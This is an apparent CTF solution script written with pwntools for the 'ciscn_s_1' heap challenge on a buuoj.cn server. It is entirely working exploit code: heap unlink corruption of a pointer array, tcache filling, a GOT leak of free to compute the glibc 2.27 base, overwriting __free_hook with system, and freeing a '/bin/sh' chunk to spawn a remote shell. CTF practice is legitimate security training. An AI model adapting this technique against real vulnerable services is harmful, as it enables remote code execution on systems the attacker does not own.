from pwn import *

#context.log_level = 'debug'

#p = process('./ciscn_s_1')
p = remote('node4.buuoj.cn', 26624)
elf = ELF('ciscn_s_1')
libc = ELF('libc-2.27.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

def alloc(index, size, content):
    sla(b'4.show\n', b'1')
    sla(b'index:\n', str(index).encode())
    sla(b'size:\n', str(size).encode())
    ru(b'gift: ')
    heap = int(ru(b'\n')[:-1], 16)
    sa(b'content:\n', content)
    return heap

def delete(index):
    sla(b'4.show\n', b'2')
    sla(b'index:\n', str(index).encode())

def edit(index, content):
    sla(b'4.show\n', b'3')
    sla(b'index:\n', str(index).encode())
    sa(b'content:\n', content)

def show(index):
    sla(b'4.show\n', b'4')
    sla(b'index:\n', str(index).encode())

heaparray = elf.sym['heap']
isAdmin = elf.sym['key2']
free_got = elf.got['free']

alloc(0, 0xf8, b'a')
alloc(1, 0x88, b'a')
alloc(2, 0xf8, b'a')
heap = alloc(3, 0x98, b'a')
heap2 = alloc(4, 0xa0, b'a')
[alloc(i + 5, 0xf8, b'a') for i in range(8)]
[delete(i + 5) for i in range(7)]

fd = heaparray - 0x18 + 0x8
bk = heaparray - 0x10 + 0x8
edit(1, p64(0) + p64(0x81) + p64(fd) + p64(bk) + b'a' * 0x60 + p64(0x80))

delete(2)

edit(1, p64(0) * 2 + p64(heap) + p64(free_got) + p64(0) + p64(heap) + p64(heap2) + p64(heap2))

delete(0)
delete(3)
alloc(0, 0x90, p64(isAdmin))
alloc(3, 0x90, b'a')
alloc(2, 0x90, p32(1))

show(1)
libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['free']
success('libc_base -> {}'.format(hex(libc_base)))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

delete(4)
delete(5)

alloc(4, 0xa0, p64(free_hook))
alloc(5, 0xa0, b'/bin/sh\x00')
alloc(6, 0xa0, p64(system))

delete(5)

p.interactive()